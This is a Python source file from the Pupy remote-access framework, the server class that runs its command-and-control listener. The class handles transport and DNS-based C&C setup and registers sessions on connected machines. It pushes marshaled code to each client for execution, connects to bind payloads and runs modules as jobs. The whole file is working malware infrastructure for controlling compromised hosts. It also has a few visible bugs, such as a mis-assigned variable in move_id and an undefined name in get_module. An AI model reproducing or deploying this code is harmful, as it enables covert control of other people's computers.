# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

import threading
from . import PupyService
import pkgutil
import modules
import logging
from .PupyErrors import PupyModuleExit, PupyModuleError
from .PupyJob import PupyJob
from .PupyCategories import PupyCategories
from .PupyConfig import PupyConfig
from .PupyService import PupyBindService
from network.conf import transports
from network.lib.connection import PupyConnectionThread
from pupylib.utils.rpyc_utils import obtain
from pupylib.PupyDnsCnc import PupyDnsCnc
from .PupyTriggers import on_connect
from network.lib.utils import parse_transports_args
from network.lib.base import chain_transports
from network.lib.transports.httpwrap import PupyHTTPWrapperServer
from network.lib.base_launcher import LauncherError
from network.lib.igd import IGDClient, UPNPError
from os import path
from shutil import copyfile
from itertools import count, ifilterfalse
import marshal
import network.conf
import rpyc
import shlex
import socket
import errno
from . import PupyClient
import os.path

class PupyServer(threading.Thread):
    def __init__(self, config, credentials):
        super(PupyServer, self).__init__()
        self.daemon = True
        self.server = None
        self.authenticator = None
        self.httpd = None
        self.clients = []
        self.jobs = {}
        self.jobs_id = 1
        self.clients_lock = threading.Lock()
        self._current_id = []
        self._current_id_lock = threading.Lock()

        self.config = config or PupyConfig()
        self.credentials = credentials or PupyCredentials()

        self.port = self.config.getint('pupyd', 'port')
        self.address = self.config.getip('pupyd', 'address') or ''

        if self.address:
            self.ipv6 = self.address.version == 6
            self.address = str(self.address)
        else:
            self.ipv6 = self.config.getboolean('pupyd', 'ipv6')

        transport_args = self.config.get('pupyd', 'transport_args')
        if transport_args:
            transport_args = [ x.strip() for x in transport_args.split(' ', 1) if x ]
        else:
            transport_args = []

        self.transport = self.config.get('pupyd', 'transport')
        self.transport_kwargs = transport_args[1] if len(transport_args) > 1 else None

        self.handler = None
        self.handler_registered = threading.Event()
        self.categories = PupyCategories(self)
        self.igd = None
        self.finished = threading.Event()
        self._cleanups = []
        self._singles = {}

        if self.config.getboolean('pupyd', 'httpd'):
            self.httpd = True

        try:
            self.igd = IGDClient(
                available=config.getboolean('pupyd', 'igd')
            )
        except UPNPError as e:
            pass

        self.dnscnc = None

        dnscnc = self.config.get('pupyd', 'dnscnc')
        if dnscnc and not dnscnc.lower() in ('no', 'false', 'stop', 'n', 'disable'):
            if ':' in dnscnc:
                fdqn, dnsport = dnscnc.split(':')
            else:
                fdqn = dnscnc.strip()
                dnsport = 5454

            try:
                self.dnscnc = PupyDnsCnc(
                    igd=self.igd,
                    config=self.config,
                    credentials=self.credentials
                )
            except Exception, e:
                logging.error('DnsCNC failed: {}'.format(e))


    def create_id(self):
        """ return first lowest unused session id """
        with self._current_id_lock:
            new_id = next(ifilterfalse(self._current_id.__contains__, count(1)))
            self._current_id.append(new_id)
            return new_id

    def move_id(self, dst_id, src_id):
        """ return first lowest unused session id """
        with self.clients_lock:
            if isinstance(dst_id, int):
                dst_client = [ x for x in self.clients if x.desc['id'] == dst_id ]
                if not dst_client:
                    raise ValueError('Client with id {} not found'.format(dst_id))
                dst_client = dst_client[0]
            else:
                dst_client = dst_id

            if isinstance(src_id, int):
                dst_client = [ x for x in self.clients if x.desc['id'] == src_id ]
                if not src_client:
                    raise ValueError('Client with id {} not found'.format(src_id))
                src_client = src_client[0]
            else:
                src_client = src_id

            with self._current_id_lock:
                self._current_id.remove(dst_client.desc['id'])
                self._current_id.append(src_client.desc['id'])

            dst_client.desc['id'] = src_client.desc['id']

    def free_id(self, id):
        with self._current_id_lock:
            try:
                self._current_id.remove(int(id))
            except ValueError:
                logging.debug('Id not found in current_id list: {}'.format(id))

    def register_handler(self, instance):
        """ register the handler instance, typically a PupyCmd, and PupyWeb in the futur"""
        self.handler=instance
        self.handler_registered.set()

    def add_client(self, conn):
        pc=None
        with open(path.join(self.config.root, 'pupylib', 'PupyClientInitializer.py')) as initializer:
            conn.execute(
                'import marshal;exec marshal.loads({})'.format(
                    repr(marshal.dumps(compile(initializer.read(), '<loader>', 'exec')))
                )
            )

        with self.clients_lock:
            client_id = self.create_id()
            try:
                client_info = conn.get_infos()
                client_info = obtain(client_info)
            except:
                client_info = {
                    "launcher" : str(conn.get_infos("launcher")),
                    "launcher_args" : [ x for x in conn.get_infos("launcher_args") ],
                    "transport" : str(conn.get_infos("transport")),
                    "daemonize" : bool(conn.get_infos("daemonize")),
                    "native": bool(conn.get_infos("native")),
                    "sid": conn.get_infos("sid") or '',
                }
            address=conn._conn._config['connid']
            try:
                if type(address) is list:
                    address=address[0]
                address=conn._conn._config['connid'].rsplit(':',1)[0]
            except:
                address=str(address)

            client_info.update({
                "id": client_id,
                "conn" : conn,
                "address" : address
            })

            client_info.update(conn.namespace["get_uuid"]())

            pc=PupyClient.PupyClient(client_info, self)
            self.clients.append(pc)
            if self.handler:
                addr = conn.modules['pupy'].get_connect_back_host()
                try:
                    client_ip, client_port = conn._conn._config['connid'].rsplit(':', 1)
                except:
                    client_ip, client_port = "0.0.0.0", 0 # TODO for bind payloads

                self.handler.display_srvinfo("Session {} opened ({}@{}) ({}{}:{})".format(
                    client_id,
                    client_info.get('user','?'),
                    client_info.get('hostname','?'),
                    '{} <- '.format(addr) if not '0.0.0.0' in addr else '',
                    client_ip, client_port)
                )
        if pc:
            on_connect(pc)

    def remove_client(self, conn):
        with self.clients_lock:
            client = [ x for x in self.clients if ( x.conn is conn or x is conn ) ]
            if not client:
                logging.debug('No clients matches request: {}'.format(conn))
                return

            client = client[0]

            self.clients.remove(client)
            self.free_id(client.desc['id'])

            if self.handler:
                self.handler.display_srvinfo('Session {} closed'.format(client.desc['id']))

    def get_clients(self, search_criteria):
        """ return a list of clients corresponding to the search criteria. ex: platform:*win* """
        #if the criteria is a simple id we return the good client

        if not search_criteria:
            return self.clients

        try:
            indexes = set(
                int(x) for x in str(search_criteria).split(',')
            )

            return [
                c for c in self.clients if c.desc['id'] in indexes
            ]
        except Exception, e:
            pass

        if not type(search_criteria) in (str, unicode):
            return

        l=set([])

        if search_criteria=="*":
            return self.clients

        for c in self.clients:
            take = False
            tags = self.config.tags(c.node())
            for sc in search_criteria.split():
                tab = sc.split(":",1)
                #if the field is specified we search for the value in this field
                if len(tab)==2 and tab[0] in c.desc:
                    take=True
                    if not tab[1].lower() in str(c.desc[tab[0]]).lower():
                        take=False
                        break
                elif len(tab)==2 and tab[0] == 'tag' and tab[1] in tags:
                    take = True
                elif len(tab)==2 and tab[0] == 'tags':
                    if '&' in tab[1]:
                        take = all(x in tags for x in tab[1].split('&') if x)
                    else:
                        take = any(x in tags for x in tab[1].split(',') if x)
                elif len(tab)!=2:#if there is no field specified we search in every field for at least one match
                    take=False
                    if tab[0] in tags:
                        take = True
                    else:
                        for k,v in c.desc.iteritems():
                            if type(v) is unicode or type(v) is str:
                                if tab[0].lower() in v.decode('utf8').lower():
                                    take=True
                                    break
                            else:
                                if tab[0].lower() in str(v).decode('utf8').lower():
                                    take=True
                                    break
                        if not take:
                            break
            if take:
                l.add(c)

        return list(l)

    def get_clients_list(self):
        return self.clients

    def iter_modules(self):
        """ iterate over all modules """
        l=[]

        for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__ + ['modules']):
            if module_name=="lib":
                continue
            try:
                yield self.get_module(module_name)
            except ImportError as e:
                logging.warning("%s : module %s disabled"%(e, module_name))

    def get_module_completer(self, module_name):
        """ return the module PupyCompleter if any is defined"""
        module=self.get_module(module_name)
        ps=module(None,None)
        return ps.arg_parser.get_completer()

    def get_module_name_from_category(self, path):
        """ take a category virtual path and return the module's name or the path untouched if not found """
        mod=self.categories.get_module_from_path(path)
        if mod:
            return mod.get_name()
        else:
            return path

    def get_aliased_modules(self):
        """ return a list of aliased module names that have to be displayed as commands """
        l=[]
        for m in self.iter_modules():
            if not m.is_module:
                l.append(m.get_name())
        return l

    def get_module(self, name):
        module=pkgutil.get_loader("modules."+name).load_module(name)
        class_name=None
        if hasattr(module,"__class_name__"):
            class_name=module.__class_name__
            if not hasattr(module,class_name):
                logging.error("script %s has a class_name=\"%s\" global variable defined but this class does not exists in the script !"%(module_name,class_name))
        if not class_name:
            #TODO automatically search the class name in the file
            exit("Error : no __class_name__ for module %s"%module)
        return getattr(module,class_name)

    def module_parse_args(self, module_name, args):
        """ This method is used by the PupyCmd class to verify validity of arguments passed to a specific module """
        module=self.get_module(module_name)
        ps=module(None,None)
        if ps.known_args:
            return ps.arg_parser.parse_known_args(args)
        else:
            return ps.arg_parser.parse_args(args)

    def del_job(self, job_id):
        if job_id is not None:
            job_id=int(job_id)
            if job_id in self.jobs:
                del self.jobs[job_id]

    def add_job(self, job):
        job.id=self.jobs_id
        self.jobs[self.jobs_id]=job
        self.jobs_id+=1

    def get_job(self, job_id):
        try:
            job_id=int(job_id)
        except ValueError:
            raise PupyModuleError("job id must be an integer !")
        if job_id not in self.jobs:
            raise PupyModuleError("%s: no such job !"%job_id)
        return self.jobs[job_id]

    def connect_on_client(self, launcher_args):
        """ connect on a client that would be running a bind payload """
        launcher=network.conf.launchers["connect"](connect_on_bind_payload=True)
        try:
            launcher.parse_args(shlex.split(launcher_args))
        except LauncherError as e:
            launcher.arg_parser.print_usage()
            return

        try:
            stream=launcher.iterate().next()
        except socket.error as e:
            self.handler.display_error("Couldn't connect to pupy: {}".format(e))
            return

        self.handler.display_success("Connected. Starting session")
        bgsrv=PupyConnectionThread(
            self,
            PupyBindService,
            rpyc.Channel(stream),
            config={
                'connid': launcher.args.host
            })
        bgsrv.start()

    def run(self):
        self.handler_registered.wait()
        t = transports[self.transport]()

        if self.httpd:
            t.server_transport = chain_transports(
                PupyHTTPWrapperServer.custom(server=self),
                t.server_transport
            )

        transport_kwargs=t.server_transport_kwargs
        if self.transport_kwargs:
            opt_args=parse_transports_args(self.transport_kwargs)
            for val in opt_args:
                if val.lower() in t.server_transport_kwargs:
                    transport_kwargs[val.lower()]=opt_args[val]
                else:
                    logging.warning("unknown transport argument : %s"%val)
        if t.authenticator:
            authenticator=t.authenticator()
        else:
            authenticator=None
        try:
            t.parse_args(transport_kwargs)
        except Exception as e:
            logging.exception(e)

        try:
            self.server = t.server(
                PupyService,
                port=self.port, hostname=self.address,
                authenticator=authenticator,
                stream=t.stream,
                transport=t.server_transport,
                transport_kwargs=t.server_transport_kwargs,
                pupy_srv=self,
                ipv6=self.ipv6,
                igd=self.igd
            )

            self.server.start()
        except socket.error as e:
            if e.errno == errno.EACCES:
                logging.error('Insufficient privileges to bind on port {}'.format(self.port))
            else:
                logging.exception(e)
        except Exception as e:
            logging.exception(e)
        finally:
            self.finished.set()

    def register_cleanup(self, cleanup):
        self._cleanups.append(cleanup)

    def single(self, ctype, *args, **kwargs):
        single = self._singles.get(ctype)
        if not single:
            single = ctype(*args, **kwargs)
            self._singles[ctype] = single

        return single

    def stop(self):
        for cleanup in self._cleanups:
            cleanup()

        self._cleanups = []

        if self.server:
            self.server.close()

        self.finished.set()
